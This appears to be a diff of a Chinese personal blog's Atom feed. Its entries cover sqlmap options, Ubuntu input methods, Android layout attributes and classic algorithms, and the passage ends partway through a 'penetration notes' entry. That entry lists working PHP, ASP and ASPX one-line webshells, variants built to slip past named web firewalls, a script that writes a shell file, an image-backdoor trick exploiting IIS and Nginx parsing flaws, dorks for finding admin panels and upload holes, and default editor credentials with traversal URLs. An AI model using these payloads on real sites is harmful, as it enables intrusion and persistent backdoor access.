href="http://sqlmap.sourceforge.net" target="_blank" rel="external">http://sqlmap.sourceforge.net</a>)”  #指定user-agent注入<br>–eta          #盲注<br>/pentest/database/sqlmap/txt/<br>common-columns.txt　　字段字典　　　<br>common-outputs.txt<br>common-tables.txt      表字典<br>keywords.txt<br>oracle-default-passwords.txt<br>user-agents.txt<br>wordlist.txt </p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;  1.&lt;br&gt; -u  #注入点&lt;br&gt;–sql-shell  返回sql shell&lt;br&gt;-f  #指纹判别数据库类型&lt;br&gt;-b  #获取数据库版本信息&lt;br&gt;-p  #指定可测试的参数(?page=1&amp;amp;id=2 -p “page,id”)&lt;br&gt;-D “”  #&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="渗透，sqlmap" scheme="http://www.craymc.com/tags/%E6%B8%97%E9%80%8F%EF%BC%8Csqlmap/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Ubuntu上切换输入法（打开右上角的小键盘）</title>
+    <link href="http://www.craymc.com/2015/12/23/Ubuntu%E4%B8%8A%E5%88%87%E6%8D%A2%E8%BE%93%E5%85%A5%E6%B3%95%EF%BC%88%E6%89%93%E5%BC%80%E5%8F%B3%E4%B8%8A%E8%A7%92%E7%9A%84%E5%B0%8F%E9%94%AE%E7%9B%98%EF%BC%89/"/>
+    <id>http://www.craymc.com/2015/12/23/Ubuntu上切换输入法（打开右上角的小键盘）/</id>
+    <published>2015-12-23T10:03:30.000Z</published>
+    <updated>2016-07-20T10:47:18.972Z</updated>
+    
+    <content type="html"><![CDATA[<p>方法/步骤：<br>　　1、从system settings 进入language support 在keyboard input method system 中选择 ibus (这里以ibus为例) 然后close。这时 按 ctrl+ 空格 还是切换不了的，需要设置下 IBUS；<br>　　2、右击 任务栏右上角的 键盘图表 点击 preferences (首选项) 如果没有 看见键盘图表的 就打开终端 输入命令 ibus-daemon -d -x -r 启动 ibus；<br>　　3、点击 input method (输入法) tab 页 点击 select an input method (选择一个输入法) – chinese (汉语) 然后选择 拼音 或五笔（个人喜好），然后点击 add ，close。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;方法/步骤：&lt;br&gt;　　1、从system settings 进入language support 在keyboard input method system 中选择 ibus (这里以ibus为例) 然后close。这时 按 ctrl+ 空格 还是切换不了的，需要设置下 
+    
+    </summary>
+    
+    
+      <category term="Linux" scheme="http://www.craymc.com/tags/Linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>android控件属性大全</title>
+    <link href="http://www.craymc.com/2015/12/23/android%E6%8E%A7%E4%BB%B6%E5%B1%9E%E6%80%A7%E5%A4%A7%E5%85%A8/"/>
+    <id>http://www.craymc.com/2015/12/23/android控件属性大全/</id>
+    <published>2015-12-23T10:01:36.000Z</published>
+    <updated>2016-07-20T10:47:18.972Z</updated>
+    
+    <content type="html"><![CDATA[<p>第一类:属性值为true或false<br>android:layout_centerHrizontal  水平居中<br>android:layout_centerVertical   垂直居中<br>android:layout_centerInparent    相对于父元素完全居中<br>android:layout_alignParentBottom 贴紧父元素的下边缘<br>android:layout_alignParentLeft   贴紧父元素的左边缘<br>android:layout_alignParentRight  贴紧父元素的右边缘<br>android:layout_alignParentTop    贴紧父元素的上边缘<br>android:layout_alignWithParentIfMissing  如果对应的兄弟元素找不到的话就以父元素做参照物<br><a id="more"></a><br>第二类：属性值必须为id的引用名“@id/id-name”<br>android:layout_below      在某元素的下方<br>android:layout_above      在某元素的的上方<br>android:layout_toLeftOf   在某元素的左边<br>android:layout_toRightOf  在某元素的右边<br>android:layout_alignTop   本元素的上边缘和某元素的的上边缘对齐<br>android:layout_alignLeft  本元素的左边缘和某元素的的左边缘对齐<br>android:layout_alignBottom 本元素的下边缘和某元素的的下边缘对齐<br>android:layout_alignRight  本元素的右边缘和某元素的的右边缘对齐 </p>
+<p>第三类：属性值为具体的像素值，如30dip，40px<br>android:layout_marginBottom       离某元素底边缘的距离<br>android:layout_marginLeft         离某元素左边缘的距离<br>android:layout_marginRight        离某元素右边缘的距离<br>android:layout_marginTop          离某元素上边缘的距离</p>
+<p>EditText的android:hint  设置EditText为空时输入框内的提示信息。</p>
+<p>android:gravity　<br>android:gravity属性是对该view 内容的限定．比如一个button 上面的text.  你可以设置该text 在view的靠左，靠右等位置．以button为例，android:gravity=”right”则button上面的文字靠右</p>
+<p>android:layout_gravity<br>android:layout_gravity是用来设置该view相对与起父view 的位置．比如一个button 在linearlayout里，你想把该button放在靠左、靠右等位置就可以通过该属性设置．以button为例，android:layout_gravity=”right”则button靠右</p>
+<p>android:scaleType：<br>android:scaleType是控制图片如何resized/moved来匹对ImageView的size。ImageView.ScaleType / android:scaleType值的意义区别：<br>CENTER /center  按图片的原来size居中显示，当图片长/宽超过View的长/宽，则截取图片的居中部分显示<br>CENTER_CROP / centerCrop  按比例扩大图片的size居中显示，使得图片长(宽)等于或大于View的长(宽)<br>CENTER_INSIDE / centerInside  将图片的内容完整居中显示，通过按比例缩小或原来的size使得图片长/宽等于或小于View的长/宽<br>FIT_CENTER / fitCenter  把图片按比例扩大/缩小到View的宽度，居中显示<br>FIT_END / fitEnd   把图片按比例扩大/缩小到View的宽度，显示在View的下部分位置<br>FIT_START / fitStart  把图片按比例扩大/缩小到View的宽度，显示在View的上部分位置<br>FIT_XY / fitXY  把图片不按比例扩大/缩小到View的大小显示<br>MATRIX / matrix 用矩阵来绘制，动态缩小放大图片来显示。<br>** 要注意一点，Drawable文件夹里面的图片命名是不能大写的。</p>
+<p>android:id<br>为控件指定相应的ID</p>
+<p>android:text<br>指定控件当中显示的文字，需要注意的是，这里尽量使用strings.xml文件当中的字符串</p>
+<p>android:gravity<br>指定View组件的对齐方式，比如说居中，居右等位置 这里指的是控件中的文本位置并不是控件本身</p>
+<p>android:layout_gravity<br>指定Container组件的对齐方式．比如一个button 在linearlayout里，你想把该button放在靠左、靠右等位置就可以通过该属性设置．以button为 例，android:layout_gravity=”right”则button靠右</p>
+<p>android:textSize<br>指定控件当中字体的大小</p>
+<p>android:background<br>指定该控件所使用的背景色，RGB命名法</p>
+<p>android:width<br>指定控件的宽度</p>
+<p>android:height<br>指定控件的高度</p>
+<p>android:layout_width<br>指定Container组件的宽度</p>
+<p>android:layout_height<br>指定Container组件的高度</p>
+<p>android:layout_weight<br>View中很重要的属性，按比例划分空间</p>
+<p>android:padding*<br>指定控件的内边距，也就是说控件当中的内容</p>
+<p>android:sigleLine<br>如果设置为真的话，则控件的内容在同一行中进行显示</p>
+<p>android:scaleType<br>是控制图片如何resized/moved来匹对ImageView的siz</p>
+<p>android:layout_centerHrizontal<br>水平居中</p>
+<p>android:layout_centerVertical<br>垂直居中</p>
+<p>android:layout_centerInparent<br>相对于父元素完全居中</p>
+<p>android:layout_alignParentBottom<br>贴紧父元素的下边缘</p>
+<p>android:layout_alignParentLeft<br>贴紧父元素的左边缘</p>
+<p>android:layout_alignParentRight<br>贴紧父元素的右边缘</p>
+<p>android:layout_alignParentTop<br>贴紧父元素的上边缘</p>
+<p>android:layout_alignWithParentIfMissing<br>如果对应的兄弟元素找不到的话就以父元素做参照物</p>
+<p>android:layout_below<br>在某元素的下方</p>
+<p>android:layout_above<br>在某元素的的上方</p>
+<p>android:layout_toLeftOf<br>在某元素的左边</p>
+<p>android:layout_toRightOf<br>在某元素的右边</p>
+<p>android:layout_alignTop<br>本元素的上边缘和某元素的的上边缘对齐</p>
+<p>android:layout_alignLeft<br>本元素的左边缘和某元素的的左边缘对齐</p>
+<p>android:layout_alignBottom<br>本元素的下边缘和某元素的的下边缘对齐</p>
+<p>android:layout_alignRight<br>本元素的右边缘和某元素的的右边缘对齐</p>
+<p>android:layout_marginBottom<br>离某元素底边缘的距离</p>
+<p>android:layout_marginLeft<br>离某元素左边缘的距离</p>
+<p>android:layout_marginRight<br>离某元素右边缘的距离</p>
+<p>android:layout_marginTop<br>离某元素上边缘的距离</p>
+<p>android:paddingLeft<br>本元素内容离本元素右边缘的距离</p>
+<p>android:paddingRight<br>本元素内容离本元素上边缘的距离</p>
+<p>android：visibility<br>值有三种：<br>visible—&gt;可见<br>invisible–&gt;不可见(透明状态)<br>gone–&gt;相当于去掉，不占位置和大小</p>
+<p>android:interpolator<br>   动画的进度使用 Interpolator 控制。interpolator 定义了动画的变化速度，可以实现匀速、正加速、负加速、无规则变加速等。Interpolator 是基类，封装了所有 Interpolator 的共同方法，它只有一个方法，即 getInterpolation (float input)，该方法 maps a point on the timeline to a multiplier to be applied to the transformations of an animation。Android 提供了几个 Interpolator 子类，实现了不同的速度曲线，如下：<br>AccelerateDecelerateInterpolator        在动画开始与介绍的地方速率改变比较慢，在中间的时侯加速<br>AccelerateInterpolator        在动画开始的地方速率改变比较慢，然后开始加速<br>CycleInterpolator        动画循环播放特定的次数，速率改变沿着正弦曲线<br>DecelerateInterpolator        在动画开始的地方速率改变比较慢，然后开始减速<br>LinearInterpolator        在动画的以均匀的速率改变<br>对于 LinearInterpolator ，变化率是个常数，即 f (x) = x.<br>public float getInterpolation(float input) {<br>return input;<br>}<br>Interpolator其他的几个子类，也都是按照特定的算法，实现了对变化率。还可以定义自己的 Interpolator 子类，实现抛物线、自由落体等物理效果。<br>、  </p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;第一类:属性值为true或false&lt;br&gt;android:layout_centerHrizontal  水平居中&lt;br&gt;android:layout_centerVertical   垂直居中&lt;br&gt;android:layout_centerInparent    相对于父元素完全居中&lt;br&gt;android:layout_alignParentBottom 贴紧父元素的下边缘&lt;br&gt;android:layout_alignParentLeft   贴紧父元素的左边缘&lt;br&gt;android:layout_alignParentRight  贴紧父元素的右边缘&lt;br&gt;android:layout_alignParentTop    贴紧父元素的上边缘&lt;br&gt;android:layout_alignWithParentIfMissing  如果对应的兄弟元素找不到的话就以父元素做参照物&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="android" scheme="http://www.craymc.com/tags/android/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>十大排序</title>
+    <link href="http://www.craymc.com/2015/12/23/%E5%8D%81%E5%A4%A7%E6%8E%92%E5%BA%8F/"/>
+    <id>http://www.craymc.com/2015/12/23/十大排序/</id>
+    <published>2015-12-23T09:59:17.000Z</published>
+    <updated>2016-07-20T10:47:18.976Z</updated>
+    
+    <content type="html"><![CDATA[<p>算法一：快速排序算法</p>
+<p>快速排序是由东尼·霍尔所发展的一种排序算法。在平均状况下，排序 n 个项目要Ο(n log n)次比较。在最坏状况下则需要Ο(n2)次比较，但这种状况并不常见。事实上，快速排序通常明显比其他Ο(n log n) 算法更快，因为它的内部循环（inner loop）可以在大部分的架构上很有效率地被实现出来。<br>快速排序使用分治法（Divide and conquer）策略来把一个串行（list）分为两个子串行（sub-lists）。<br><a id="more"></a><br>算法步骤：<br>1 从数列中挑出一个元素，称为 “基准”（pivot），<br>2 重新排序数列，所有元素比基准值小的摆放在基准前面，所有元素比基准值大的摆在基准的后面（相同的数可以到任一边）。在这个分区退出之后，该基准就处于数列的中间位置。这个称为分区（partition）操作。<br>3 递归地（recursive）把小于基准值元素的子数列和大于基准值元素的子数列排序。<br>递归的最底部情形，是数列的大小是零或一，也就是永远都已经被排序好了。虽然一直递归下去，但是这个算法总会退出，因为在每次的迭代（iteration）中，它至少会把一个元素摆到它最后的位置去。</p>
+<p>算法二：堆排序算法</p>
+<p>堆排序（Heapsort）是指利用堆这种数据结构所设计的一种排序算法。堆积是一个近似完全二叉树的结构，并同时满足堆积的性质：即子结点的键值或索引总是小于（或者大于）它的父节点。</p>
+<p>堆排序的平均时间复杂度为Ο(nlogn) 。</p>
+<p>算法步骤：<br>创建一个堆H[0..n-1]<br>把堆首（最大值）和堆尾互换</p>
+<ol>
+<li>把堆的尺寸缩小1，并调用shift_down(0),目的是把新的数组顶端数据调整到相应位置</li>
+<li>重复步骤2，直到堆的尺寸为1</li>
+</ol>
+<p>算法三：归并排序<br>归并排序（Merge sort，台湾译作：合并排序）是建立在归并操作上的一种有效的排序算法。该算法是采用分治法（Divide and Conquer）的一个非常典型的应用。</p>
+<p>算法步骤：</p>
+<ol>
+<li>申请空间，使其大小为两个已经排序序列之和，该空间用来存放合并后的序列</li>
+<li>设定两个指针，最初位置分别为两个已经排序序列的起始位置</li>
+<li>比较两个指针所指向的元素，选择相对小的元素放入到合并空间，并移动指针到下一位置</li>
+<li>重复步骤3直到某一指针达到序列尾</li>
+<li>将另一序列剩下的所有元素直接复制到合并序列尾</li>
+</ol>
+<p>算法四：二分查找算法<br>二分查找算法是一种在有序数组中查找某一特定元素的搜索算法。搜素过程从数组的中间元素开始，如果中间元素正好是要查找的元素，则搜 素过程结束；如果某一特定元素大于或者小于中间元素，则在数组大于或小于中间元素的那一半中查找，而且跟开始一样从中间元素开始比较。如果在某一步骤数组 为空，则代表找不到。这种搜索算法每一次比较都使搜索范围缩小一半。折半搜索每次把搜索区域减少一半，时间复杂度为Ο(logn) 。</p>
+<p>算法五：BFPRT(线性查找算法)</p>
+<p>BFPRT算法解决的问题十分经典，即从某n个元素的序列中选出第k大（第k小）的元素，通过巧妙的分 析，BFPRT可以保证在最坏情况下仍为线性时间复杂度。该算法的思想与快速排序思想相似，当然，为使得算法在最坏情况下，依然能达到o(n)的时间复杂 度，五位算法作者做了精妙的处理。</p>
+<p>算法步骤：</p>
+<ol>
+<li>将n个元素每5个一组，分成n/5(上界)组。</li>
+<li>取出每一组的中位数，任意排序方法，比如插入排序。</li>
+<li>递归的调用selection算法查找上一步中所有中位数的中位数，设为x，偶数个中位数的情况下设定为选取中间小的一个。</li>
+<li>用x来分割数组，设小于等于x的个数为k，大于x的个数即为n-k。</li>
+<li>若i==k，返回x；若i<k，在小于x的元素中递归查找第i小的元素；若i>k，在大于x的元素中递归查找第i-k小的元素。<br>终止条件：n=1时，返回的即是i小元素。</k，在小于x的元素中递归查找第i小的元素；若i></li>
+</ol>
+<p>算法六：DFS（深度优先搜索）</p>
+<p>深度优先搜索算法（Depth-First-Search），是搜索算法的一种。它沿着树的深度遍历树的节点，尽可能深的搜索树的分 支。当节点v 的所有边都己被探寻过，搜索将回溯到发现节点v的那条边的起始节点。这一过程一直进行到已发现从源节点可达的所有节点为止。如果还存在未被发 现的节点，则选择其中一个作为源节点并重复以上过程，整个进程反复进行直到所有节点都被访问为止。DFS属于盲目搜索。</p>
+<p>深度优先搜索是图论中的经典算法，利用深度优先搜索算法可以产生目标图的相应拓扑排序表，利用拓扑排序表可以方便的解决很多相关的图论问题，如最大路径问题等等。一般用堆数据结构来辅助实现DFS算法。</p>
+<p>深度优先遍历图算法步骤：</p>
+<ol>
+<li>访问顶点v；</li>
+<li>依次从v的未被访问的邻接点出发，对图进行深度优先遍历；直至图中和v有路径相通的顶点都被访问；</li>
+<li>若此时图中尚有顶点未被访问，则从一个未被访问的顶点出发，重新进行深度优先遍历，直到图中所有顶点均被访问过为止。<br>上述描述可能比较抽象，举个实例：<br>DFS 在访问图中某一起始顶点 v 后，由 v 出发，访问它的任一邻接顶点 w1；再从 w1 出发，访问与 w1邻 接但还没有访问过的顶点 w2；然后再从 w2 出发，进行类似的访问，… 如此进行下去，直至到达所有的邻接顶点都被访问过的顶点 u 为止。<br>接着，退回一步，退到前一次刚访问过的顶点，看是否还有其它没有被访问的邻接顶点。如果有，则访问此顶点，之后再从此顶点出发，进行与前述类似的访问；如果没有，就再退回一步进行搜索。重复上述过程，直到连通图中所有顶点都被访问过为止。</li>
+</ol>
+<p>算法七：BFS(广度优先搜索)</p>
+<p>广度优先搜索算法（Breadth-First-Search），是一种图形搜索算法。简单的说，BFS是从根节点开始，沿着树(图)的宽度遍历树(图)的节点。如果所有节点均被访问，则算法中止。BFS同样属于盲目搜索。一般用队列数据结构来辅助实现BFS算法。</p>
+<p>算法步骤：</p>
+<ol>
+<li>首先将根节点放入队列中。</li>
+<li>从队列中取出第一个节点，并检验它是否为目标。<br>如果找到目标，则结束搜寻并回传结果。<br>否则将它所有尚未检验过的直接子节点加入队列中。</li>
+<li>若队列为空，表示整张图都检查过了——亦即图中没有欲搜寻的目标。结束搜寻并回传“找不到目标”。</li>
+<li>重复步骤2。</li>
+</ol>
+<p>算法八：Dijkstra算法</p>
+<p>戴克斯特拉算法（Dijkstra’s algorithm）是由荷兰计算机科学家艾兹赫尔·戴克斯特拉提出。迪科斯彻算法使用了广度优先搜索解决非负权有向图的单源最短路径问题，算法最终得到一个最短路径树。该算法常用于路由算法或者作为其他图算法的一个子模块。</p>
+<p>该算法的输入包含了一个有权重的有向图 G，以及G中的一个来源顶点 S。我们以 V 表示 G 中所有顶点的集合。每一个图中的边，都是两个顶点所形成的有序元素对。(u, v) 表示从顶点 u 到 v 有路径相连。我们以 E 表示G中所有边的集合，而边的权重则由权重函数 w: E → [0, ∞] 定义。因此，w(u, v) 就是从顶点 u 到顶点 v 的非负权重（weight）。边的权重可以想像成两个顶点之间的距离。任两点间路径的权重，就是该路径上所有边的权重总和。已知有 V 中有顶点 s 及 t，Dijkstra 算法可以找到 s 到 t的最低权重路径(例如，最短路径)。这个算法也可以在一个图中，找到从一个顶点 s 到任何其他顶点的最短路径。对于不含负权的有向图，Dijkstra算法是目前已知的最快的单源最短路径算法。</p>
+<p>算法步骤：</p>
+<ol>
+<li>初始时令 S={V0},T={其余顶点}，T中顶点对应的距离值<br>若存在<v0,vi>，d(V0,Vi)为<v0,vi>弧上的权值<br>若不存在<v0,vi>，d(V0,Vi)为∞</v0,vi></v0,vi></v0,vi></li>
+<li>从T中选取一个其距离值为最小的顶点W且不在S中，加入S</li>
+<li>对其余T中顶点的距离值进行修改：若加进W作中间顶点，从V0到Vi的距离值缩短，则修改此距离值<br>重复上述步骤2、3，直到S中包含所有顶点，即W=Vi为止</li>
+</ol>
+<p>算法九：动态规划算法</p>
+<p>动态规划（Dynamic programming）是一种在数学、计算机科学和经济学中使用的，通过把原问题分解为相对简单的子问题的方式求解复杂问题的方法。 动态规划常常适用于有重叠子问题和最优子结构性质的问题，动态规划方法所耗时间往往远少于朴素解法。</p>
+<p>动态规划背后的基本思想非常简单。大致上，若要解一个给定问题，我们需要解其不同部分（即子问题），再合并子问题的解以得出原问题的解。 通常许多 子问题非常相似，为此动态规划法试图仅仅解决每个子问题一次，从而减少计算量： 一旦某个给定子问题的解已经算出，则将其记忆化存储，以便下次需要同一个 子问题解之时直接查表。 这种做法在重复子问题的数目关于输入的规模呈指数增长时特别有用。</p>
+<p>关于动态规划最经典的问题当属背包问题。</p>
+<p>算法步骤：</p>
+<ol>
+<li>最优子结构性质。如果问题的最优解所包含的子问题的解也是最优的，我们就称该问题具有最优子结构性质（即满足最优化原理）。最优子结构性质为动态规划算法解决问题提供了重要线索。</li>
+<li>子问题重叠性质。子问题重叠性质是指在用递归算法自顶向下对问题进行求解时，每次产生的子问题并不总是新问题，有些子问题会被重复计算多次。 动态规划算法正是利用了这种子问题的重叠性质，对每一个子问题只计算一次，然后将其计算结果保存在一个表格中，当再次需要计算已经计算过的子问题时，只是 在表格中简单地查看一下结果，从而获得较高的效率。</li>
+</ol>
+<p>算法十：朴素贝叶斯分类算法</p>
+<p>朴素贝叶斯分类算法是一种基于贝叶斯定理的简单概率分类算法。贝叶斯分类的基础是概率推理，就是在各种条件的存在不确定，仅知其出现概率的情况下， 如何完成推理和决策任务。概率推理是与确定性推理相对应的。而朴素贝叶斯分类器是基于独立假设的，即假设样本每个特征与其他特征都不相关。<br>朴素贝叶斯分类器依靠精确的自然概率模型，在有监督学习的样本集中能获取得非常好的分类效果。在许多实际应用中，朴素贝叶斯模型参数估计使用最大似然估计方法，换言之朴素贝叶斯模型能工作并没有用到贝叶斯概率或者任何贝叶斯模型。</p>
+<p>来源： <a href="http://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=1888&amp;extra=page%3D1%26filter%3Dtypeid%26typeid%3D31" target="_blank" rel="external">http://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=1888&amp;extra=page%3D1%26filter%3Dtypeid%26typeid%3D31</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;算法一：快速排序算法&lt;/p&gt;
+&lt;p&gt;快速排序是由东尼·霍尔所发展的一种排序算法。在平均状况下，排序 n 个项目要Ο(n log n)次比较。在最坏状况下则需要Ο(n2)次比较，但这种状况并不常见。事实上，快速排序通常明显比其他Ο(n log n) 算法更快，因为它的内部循环（inner loop）可以在大部分的架构上很有效率地被实现出来。&lt;br&gt;快速排序使用分治法（Divide and conquer）策略来把一个串行（list）分为两个子串行（sub-lists）。&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="算法" scheme="http://www.craymc.com/tags/%E7%AE%97%E6%B3%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>渗透笔记</title>
+    <link href="http://www.craymc.com/2015/12/23/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/"/>
+    <id>http://www.craymc.com/2015/12/23/渗透笔记/</id>
+    <published>2015-12-23T09:47:33.000Z</published>
+    <updated>2016-07-20T10:47:18.977Z</updated>
+    
+    <content type="html"><![CDATA[<p>渗透笔记<br>本文摘录了常用的网站渗透的内容，转自春秋社区。</p>
+<p>【 常见网站程序 】<br>—————————————————————————————–<br>asp类：<br>foosun(风讯)<br>kesion(科汛)newasp(新云)<br>乔客CreateLive(创力)<br>5uCMSKingCMS<br>DvBBS(动网)<br>BBSxp[博客]zblog<br>[博客]pjblog<br>—————————————————————————————–<br>PHP类：<br>DeDeCms（织梦）<br>ECMS（帝国）<br>PHPCMS<br>PHP168<br>HBcms（宏博）SupeSite<br>CMSware(思维)Joomla!<br>[BBS]Discuz!<br>[BBS]phpWind[SNS]UCenterHome<br>[SNS]ThinkSNS[商城]EcShop<br>[商城]ShopEx[博客]WordPress<br>[维基]HDWiki<br>[微博]PHPsay[DIGG]PBdigg<br>—————————————————————————————–<br><a id="more"></a><br>php开源mysql绝对路径<br>开源系统 数据库配置文件名 文件名所在的目录<br>Discuz! config.inc.php ./ config.inc.php<br>Phpcms config.inc.php ./include/config.inc.php<br>Wodpress wp-config.php ./ wp-config.php<br>Phpwind sqlconfig.php ./data/sqlconfig.php<br>phpweb config.inc.php ./config.inc.php<br>Php168v6 mysql_config.php ./php168/ mysql_config.php<br>Shopex config.php ./config/config.php<br>Ecshop config.php ./data/config.php<br>Joomla configuration.php ./ configuration.php<br>UCenter config.inc.php ./data/config.inc.php<br>EmpireCMS config.php ./e/class/config.php<br>Dedecms common.inc.php .data/common.inc.php<br>Zen Cart configure.php ./includes/configure.php<br>Mediawiki localsettints.php ./config/localsettints.php<br>Ecshop config.php ./data/config.php<br>osCommerce configure.php ./includes/configure.php<br>—————————————————————————————–<br>【 谷歌语法 】<br>site：可以限制你搜索范围的域名.<br>inurl：用于搜索网页上包含的URL，这个语法对寻找网页上的搜索，帮助之类的很有用.<br>intext: 只搜索网页<body>部分中包含的文字(也就是忽略了标题、URL等的文字)<br>intitle: 查包含关键词的页面，一般用于社工别人的webshell密码<br>filetype：搜索文件的后缀或者扩展名<br>intitle：限制你搜索的网页标题.<br>link: 可以得到一个所有包含了某个指定URL的页面列表.<br>查找后台地址：site:域名 inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms<br>查找文本内容：site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|admin|login|sys|managetem|password|username<br>查找可注入点：site:域名 inurl:aspx|jsp|php|asp<br>查找上传漏洞：site:域名 inurl:file|load|editor|Files<br>找eweb编辑器：site:域名 inurl:ewebeditor|editor|uploadfile|eweb|edit<br>存在的数据库：site:域名 filetype:mdb|asp|#<br>查看脚本类型：site:域名 filetype:asp/aspx/php/jsp<br>迂回策略入侵：inurl:cms/data/templates/images/index/</body></p>
+<h1 id="网络设备关键词：intext-WEB-Management-Interface-for-H3C-SecPath-Series"><a href="#网络设备关键词：intext-WEB-Management-Interface-for-H3C-SecPath-Series" class="headerlink" title="网络设备关键词：intext:WEB Management Interface for H3C SecPath Series"></a>网络设备关键词：intext:WEB Management Interface for H3C SecPath Series</h1><p>【 一句话木马 】<br>asp一句话木马：&lt;%eval request(“x”)%&gt;<br>php一句话木马：&lt;?php eval($_POST[g]);?&gt;<br>aspx一句话：&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“x”],”unsafe”);%&gt;<br>网站配置、版权信息专用一句话：”%&gt;&lt;%Eval Request(x)%&gt;<br>一句话再过护卫神：&lt;%Y=request(“x”)%&gt; &lt;%execute(Y)%&gt;<br>过拦截一句话木马：&lt;% eXEcGlOBaL ReQuEsT(“x”) %&gt;<br>asp闭合型一句话 %&gt;&lt;%eval request(“0o1Znz1ow”)%&gt;&lt;%<br>能过安全狗的解析格式：;hfdjf.;dfd.;dfdfdfd.asp;sdsd.jpg<br>突破安全狗的一句话：&lt;%Y=request(“x”)%&gt; &lt;%eval(Y)%&gt;<br>elong过安全狗的php一句话：&lt;?php $a = “a”.”s”.”s”.”e”.”r”.”t”; $a($_POST[cc]); ?&gt;<br>后台常用写入php一句话（密码x）：<br>&lt;?<br>$fp = @fopen(“c.php”, ‘a’);<br>@fwrite($fp, ‘&lt;‘.’?php’.”\r\n\r\n”.’eval($_POST[x])’.”\r\n\r\n?”.”&gt;\r\n”);<br>@fclose($fp);<br>?&gt;<br>高强度php一句话：<br>&lt;?php substr(md5($_REQUEST[‘heroes’]),28)==’acd0’&amp;&amp;eval($_REQUEST[‘c’]);?&gt;<br>新型变异PHP一句话(密码b4dboy):<br>($b4dboy = $_POST[‘b4dboy’]) &amp;&amp; @preg_replace(‘/ad/e’,’@’.str_rot13(‘riny’).’($b4dboy)’, ‘add’);<br>突破安全狗的aspx一句话：<br>&lt;%@ Page Language=”C#” ValidateRequest=”false” %&gt;<br>&lt;%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[“你的密码”].Value))).CreateInstance(“c”, true, System.Reflection.BindingFlags.Default, null, new object[] { this }, null, null); } catch { }%&gt;<br>突破护卫神，保护盾一句话：<br>&lt;?php $a = str_replace(x,””,”axsxxsxexrxxt”);<br>$a($_POST[“test”]); ?&gt;<br>许多网页程序都不允许包含〈%%〉标记符号的内容的文件上传，这样一句话木马就写入不进数据库了。<br>改成：〈scriptlanguage=VBScript runat=server〉execute request(“l”)〈/Script〉<br>这样就避开了使用〈%%〉，保存为.ASP,程序照样执行的效果是一样的。<br>PHP高强度一句话：<br>&lt;?php substr(md5($_REQUEST[‘x’]),28)==’acd0’&amp;&amp;eval($_REQUEST[‘c’]);?&gt; 菜刀连接：/x.php?x=lostwolf 脚本类型：php 密码：c</p>
+<h1 id="lt-php-assert-REQUEST-“c”-gt-菜刀连接-躲避检测-密码：c"><a href="#lt-php-assert-REQUEST-“c”-gt-菜刀连接-躲避检测-密码：c" class="headerlink" title="&lt;?php assert($_REQUEST[“c”]);?&gt; 菜刀连接 躲避检测 密码：c"></a>&lt;?php assert($_REQUEST[“c”]);?&gt; 菜刀连接 躲避检测 密码：c</h1><p>【 解析漏洞总结 】<br>IIS 6.0<br>目录解析：/xx.asp/xx.jpg xx.jpg可替换为任意文本文件(e.g. xx.txt)，文本内容为后门代码<br>IIS6.0 会将 xx.jpg 解析为 asp 文件。<br>后缀解析：/xx.asp;.jpg /xx.asp:.jpg(此处需抓包修改文件名)<br>IIS6.0 都会把此类后缀文件成功解析为 asp 文件。<br>默认解析：/xx.asa /xx.cer /xx.cdx<br>IIS6.0 默认的可执行文件除了 asp 还包含这三种<br>此处可联系利用目录解析漏洞 /xx.asa/xx.jpg 或 /xx.cer/xx.jpg 或 xx.asa;.jpg<br>IIS 7.0/ IIS 7.5/ Nginx &lt;8.03<br>在默认Fast-CGI开启状况下,在一个文件路径(/xx.jpg)后面加上/xx.php会将 /xx.jpg/xx.php 解析为 php 文件。<br>常用利用方法： 将一张图和一个写入后门代码的文本文件合并 将恶意文本写入图片的二进制代码之后，避免破坏图片文件头和尾<br>e.g.<br>copy xx.jpg/b + yy.txt/a xy.jpg<br>/b 即二进制[binary]模式<br>/a 即ascii模式 xx.jpg正常图片文件<br>yy.txt 内容 &lt;?PHP fputs(fopen(‘shell.php’,’w’),’&lt;?php eval($_POST[cmd])?&gt;’);?&gt;<br>意思为写入一个内容为 &lt;?php eval($_POST[cmd])?&gt; 名称为shell.php的文件<br>找个地方上传 xy.jpg ,然后找到 xy.jpg 的地址，在地址后加上 /xx.php 即可执行恶意文本。</p>
+<h1 id="然后就在图片目录下生成一句话木马-shell-php-密码-cmd"><a href="#然后就在图片目录下生成一句话木马-shell-php-密码-cmd" class="headerlink" title=".然后就在图片目录下生成一句话木马 shell.php 密码 cmd"></a>.然后就在图片目录下生成一句话木马 shell.php 密码 cmd</h1><p>【 ewebeditor编辑器 】<br>默认后台：ewebeditor/admin_login.asp<br>帐号密码：admin admin<br>样式设计：ewebeditor/admin_style.asp<br>查看版本：ewebeditor/dialog/about.html<br>数据库路径：db/ewebeditor.mdb db/%23ewebeditor.mdb db/%23ewebeditor.asp ewebeditor/db/!@#ewebeditor.asp (用谷歌语法找文件名)<br>遍历目录：ewebeditor/admin/upload.asp?id=16&amp;d_viewmode=&amp;dir =../..<br>跳转目录：ewebeditor/admin_uoloadfile.asp？id=14&amp;dir=.. (dir为列目录, ..为返回上层目录)，形式:dir ../..<br>点上传文件管理-随便选择一个样式目录，得到：ewindoweditor/admin_uoloadfile.asp?id=14 在id=14后面加&amp;dir=../../../.. 就可看到整个网站的文件了(../自己加减)<br>( ewebeditor5.5版本 )<br>默认后台：ewebeditor/admin/login.asp<br>帐号密码：admin 